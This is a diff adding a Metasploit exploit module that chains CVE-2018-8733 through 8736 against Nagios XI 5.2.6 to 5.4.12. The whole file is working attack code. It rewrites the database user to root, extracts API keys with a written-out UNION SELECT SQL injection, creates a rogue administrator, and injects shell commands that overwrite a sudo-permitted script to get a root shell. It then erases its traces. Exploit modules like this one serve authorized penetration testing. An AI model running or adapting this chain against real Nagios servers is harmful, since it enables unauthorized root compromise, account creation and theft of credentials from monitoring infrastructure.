@@ -1,0 +1,363 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ManualRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Nagios XI Chained Remote Code Execution',
+      'Description'    => %q{
+        This module exploits a few different vulnerabilities in Nagios XI 5.2.6-5.4.12 to gain remote root access.
+        The steps are:
+          1. Issue a POST request to /nagiosql/admin/settings.php which sets the database user to root.
+          2. SQLi on /nagiosql/admin/helpedit.php allows us to enumerate API keys.
+          3. The API keys are then used to add an administrative user.
+          4. An authenticated session is established with the newly added user
+          5. Command Injection on /nagiosxi/backend/index.php allows us to execute the payload with nopasswd sudo,
+          giving us a root shell.
+          6. Remove the added admin user and reset the database user.
+      },
+      'Author'         =>
+        [
+          'Cale Smith',   # @0xC413
+          'Benny Husted', # @BennyHusted
+          'Jared Arave'   # @iotennui
+        ],
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'linux',
+      'Arch'           => [ARCH_X86],
+      'CmdStagerFlavor' => ['printf'],
+      'Targets'        =>
+        [
+          [
+            'Nagios XI 5.2.6 <= 5.4.12',
+            upper_version: Gem::Version.new('5.4.12'),
+            lower_version: Gem::Version.new('5.2.6')
+          ]
+        ],
+      'References'     =>
+        [
+          ['EDB', '44560'],
+          ['CVE', '2018-8733'],
+          ['CVE', '2018-8734'],
+          ['CVE', '2018-8735'],
+          ['CVE', '2018-8736'],
+          ['URL', 'http://blog.redactedsec.net/exploits/2018/04/26/nagios.html']
+        ],
+      'Privileged'     => true,
+      'DefaultOptions' => {
+         'WSFDELAY' => 30
+      },
+      'DisclosureDate'  => 'Apr 17, 2018',
+      'DefaultTarget'   => 0))
+    register_options(
+      [
+        #WSFDelay option is being ignored, getting around this with a call to Rex.sleep
+        #Sometimes Nagios doesn't execute commands immediately, so play with this parameter.
+        Opt::RPORT(80),
+        OptInt.new('WAIT', [ true, "Number of seconds to wait for exploit to run", 15 ])
+      ])
+    deregister_options('SRVHOST', 'SRVPORT')
+  end
+
+  def check
+    vprint_status "STEP 0: Get Nagios XI version string."
+    res = send_request_cgi!({
+      'method' => 'GET',
+      'uri'    => '/nagiosxi/'
+    })
+
+    if !res || !res.get_html_document
+      fail_with(Failure::Unknown, 'Could not check nagios version')
+    end
+
+    if (@version = res.get_html_document.at('//input[@name = "version"]/@value').text)
+      @version = Gem::Version.new(@version)
+      vprint_good("STEP 0: Found Nagios XI version: #{@version.to_s}")
+      if @version < target[:lower_version]
+        vprint_bad('Try nagios_xi_chained for this version.')
+      elsif (@version <= target[:upper_version] && @version >= target[:lower_version])
+        return CheckCode::Appears
+      end
+    end
+    CheckCode::Safe
+  end
+
+  def set_db_user(usr, passwd)
+    step = usr == 'root' ? '1' : '6.1'
+    vprint_status "STEP #{step}: Setting Nagios XI DB user to #{usr}."
+    res = send_request_cgi({
+      'uri' => '/nagiosql/admin/settings.php',
+      'method' => 'POST',
+      'ctype'  => 'application/x-www-form-urlencoded',
+      'encode_params' => true,
+      'vars_post'   => {
+        'txtRootPath'=>'nagiosql',
+        'txtBasePath'=>'/var/www/html/nagiosql/',
+        'selProtocol'=>'http',
+        'txtTempdir'=>'/tmp',
+        'selLanguage'=>'en_GB',
+        'txtEncoding'=>'utf-8',
+        'txtDBserver'=>'localhost',
+        'txtDBport'=>3306,
+        'txtDBname'=>'nagiosql',
+        'txtDBuser'=> usr,
+        'txtDBpass'=> passwd,
+        'txtLogoff'=>3600,
+        'txtLines'=>15,
+        'selSeldisable'=>1
+      }
+    })
+
+    if !res || res.code != 302
+      fail_with(Failure::UnexpectedReply,"STEP #{step}: Unexpected response setting db user to root")
+    end
+    vprint_status "STEP #{step}: Received a 302 Response. That's good!"
+  end
+
+  def get_api_keys
+    vprint_status 'STEP 2: Exploiting SQLi to extract user API keys.'
+
+    sqli_parm = @version < Gem::Version.new('5.3.0') ? 'backend_ticket' : 'api_key'
+    sqli_val = rand_text_alpha(rand(5) + 5)
+    res = send_request_cgi({
+      'uri' => '/nagiosql/admin/helpedit.php',
+      'method' => 'POST',
+      'ctype' => 'application/x-www-form-urlencoded',
+      'encode_params' => true,
+      'vars_post' => {
+        'selInfoKey1'=>"#{sqli_val}'UNION SELECT CONCAT('START_API:',#{sqli_parm},':END_API') FROM nagiosxi.xi_users-- ",
+        'hidKey1'=>'common',
+        'selInfoKey2'=>'free_variables_name',
+        'hidKey2'=>'',
+        'selInfoVersion'=>'',
+        'hidVersion'=>'',
+        'taContent'=>'',
+        'modus'=>0
+      }
+    })
+
+    if !res || res.code != 302 || !res.body
+      fail_with(Failure::UnexpectedReply,'STEP 2: Unexpected response extracting api keys')
+    end
+
+    vprint_status 'STEP 2: Received a 302 Response. That\'s good!'
+    parse_api_key(res.body)
+  end
+
+  def parse_api_key(res_body)
+    begin_positions = res_body.enum_for(:scan, /START_API:/).map { Regexp.last_match.end(0) }
+    end_positions = res_body.enum_for(:scan, /:END_API/).map { Regexp.last_match.begin(0) - 1 }
+    api_keys = []
+
+    begin_positions.each_with_index do|val, i|
+      key = res_body[val..end_positions[i]]
+      unless api_keys.include?(key)
+        api_keys << key
+      end
+    end
+
+    if api_keys.length < 1
+      fail_with(Failure::Unknown, 'Could not parse api keys')
+    end
+
+    vprint_status "Found #{api_keys.length.to_s} unique api keys"
+    api_keys.each do |key|
+      vprint_status key
+    end
+
+    api_keys
+  end
+
+  def add_admin(keys, username, password)
+    vprint_status 'STEP 3: Using API Keys to add an administrative user...'
+    keys.each do |key|
+      user_id = try_add_admin(key, username, password)
+
+      if (user_id.to_i > 0)
+        vprint_good "Added user:#{username} password:#{password} userid:#{user_id}"
+        return user_id.to_s, key
+      end
+    end
+    fail_with(Failure::Unknown, 'STEP 3: Failed to add a user.')
+  end
+
+  def try_add_admin(key, username, passwd)
+    vprint_status "STEP 3: trying to add admin user with key #{key}"
+    res = send_request_cgi({
+      'uri'=> "/nagiosxi/api/v1/system/user",
+      'method' => 'POST',
+      'ctype' => 'application/x-www-form-urlencoded',
+      'vars_get' => {
+        'apikey' => key,
+        'pretty' => 1
+      },
+      'vars_post' =>{
+        'username'   => username,
+        'password'   => passwd,
+        'name'       => rand_text_alpha(rand(5) + 5),
+        'email'      =>"#{username}@localhost",
+        'auth_level' =>'admin',
+        'force_pw_change' => 0
+      }
+    })
+
+    json = res.get_json_document
+    json['userid'] ? json['userid'].to_i : -1
+  end
+
+  def delete_admin(key, user_id)
+    res = send_request_cgi({
+      'uri'=> "/nagiosxi/api/v1/system/user/#{user_id}",
+      'method' => 'DELETE',
+      'ctype' => 'application/x-www-form-urlencoded',
+      'vars_get' => {
+        'apikey' => key
+      }
+    })
+
+    res.body && res.body.include?('was added successfully') ? username : false
+  end
+
+  def login(username, password)
+    vprint_status "STEP 4.1: Authenticate as user #{username} with password #{password}"
+    #4.1 Get nsp for login
+    vprint_status 'STEP 4.1: Get NSP and nagiosxi for login..'
+    res = send_request_cgi({
+      'uri' =>'/nagiosxi/login.php',
+      'method' => 'POST',
+      'ctype' => 'application/x-www-form-urlencoded'
+    })
+
+    if !res || !res.body
+      fail_with(Failure::Unknown, 'STEP 4.1: Could not get nsp string for login')
+    end
+
+    login_nsp = parse_nsp_str(res.body)
+    vprint_status "STEP 4.1: login_nsp #{login_nsp} "
+
+    login_nagiosxi = parse_nagiosxi(res)
+    vprint_status "STEP 4.1: login_nagiosxi #{login_nagiosxi}"
+
+    vprint_status 'STEP 4.2: Authenticating...'
+    res = send_request_cgi({
+      'uri'=> '/nagiosxi/login.php',
+      'ctype' => 'application/x-www-form-urlencoded',
+      'method' => 'POST',
+      'cookie' => "nagiosxi=#{login_nagiosxi};",
+      'vars_post'=> {
+        'nsp' => login_nsp,
+        'page' => 'auth',
+        'debug' => '',
+        'pageopt' => 'login',
+        'username' => username,
+        'password' => password,
+        'loginButton' => ''
+      }
+    })
+
+    if !res || res.code != 302
+      fail_with(Failure::Unknown, 'STEP 4.2 Could not get authed nsp string.')
+    end
+
+    authed_nagiosxi = parse_nagiosxi(res)
+    vprint_status "STEP 4.2: authed_nagiosxi #{authed_nagiosxi}"
+    authed_nagiosxi
+  end
+
+  def parse_nsp_str(resp_body)
+    nsp_strs = /var nsp_str = "(.+)";\n/.match(resp_body)
+
+    unless nsp_strs || nsp_strs.length < 2
+      fail_with(Failure::NotFound, 'Could not find nsp_str')
+    end
+
+    nsp_strs[1]
+  end
+
+  def parse_nagiosxi(res)
+    cookie = res.get_cookies
+    matches = /.*nagiosxi=(.+);/.match(cookie)
+
+    unless matches || matches.length < 2
+      fail_with(Failure::NotFound, 'Could not find nagiosxi cookie')
+    end
+
+    matches[1]
+  end
+
+  def execute_command(cmd, opts = {})
+    backup_file = rand_text_alpha(rand(5) + 10)
+
+    cmd_execution = "$(cp /usr/local/nagiosxi/scripts/reset_config_perms.sh /usr/local/nagiosxi/scripts/#{backup_file} ; echo \"#{cmd}\" > /usr/local/nagiosxi/scripts/reset_config_perms.sh ; sudo /usr/local/nagiosxi/scripts/reset_config_perms.sh) &"
+
+    cmd_cleanup = "$(mv /usr/local/nagiosxi/scripts/#{backup_file} /usr/local/nagiosxi/scripts/reset_config_perms.sh)"
+    opts_exec = {
+      'uri'=> '/nagiosxi/backend/index.php',
+      'method' => 'POST',
+      'ctype' => 'application/x-www-form-urlencoded',
+      'cookie' => "nagiosxi=#{@nagiosxi}",
+      'vars_get' => {
+        'cmd'=>'submitcommand',
+        'command'=>'1111',
+        'command_data'=> cmd_execution
+      }
+    }
+
+    opts_cleanup = {
+      'uri'=> '/nagiosxi/backend/index.php',
+      'method' => 'POST',
+      'ctype' => 'application/x-www-form-urlencoded',
+      'cookie' => "nagiosxi=#{@nagiosxi}",
+      'vars_get' => {
+        'cmd'=>'submitcommand',
+        'command'=>'1111',
+        'command_data'=> cmd_cleanup
+      }
+    }
+
+    vprint_status 'STEP 5.1: executing payload'
+    res = send_request_cgi(opts_exec)
+
+    if !res || res.code != 200
+      fail_with(Failure::Unknown, 'STEP 5.1: Command execution failed')
+    end
+
+    vprint_status 'STEP 5.2: removing scripts from disc'
+    res = send_request_cgi(opts_cleanup)
+
+    if !res || res.code != 200
+      fail_with(Failure::Unknown, 'STEP 5.2: Command cleanup failed')
+    end
+  end
+
+  def exploit
+    if check != CheckCode::Appears
+      fail_with(Failure::NotVulnerable, 'STEP 0: Vulnerable version not found! punt!')
+    end
+
+    set_db_user('root', 'nagiosxi')
+
+    keys = get_api_keys
+    username = rand_text_alpha(rand(6) + 10)
+    password = rand_text_alpha(rand(6) + 10)
+
+    user_id, key = add_admin(keys, username, password)
+    @nagiosxi = login(username, password)
+    execute_cmdstager()
+
+    #revert databaseuser
+    set_db_user('nagiosql', 'n@gweb')
+    vprint_status 'STEP 6.2: deleting admin'
+    delete_admin(key, user_id)
+
+    #The WSFDelay option is being ignored currently, so this is this workaround.
+    Rex.sleep(datastore['WAIT'].to_i)
+  end
+end
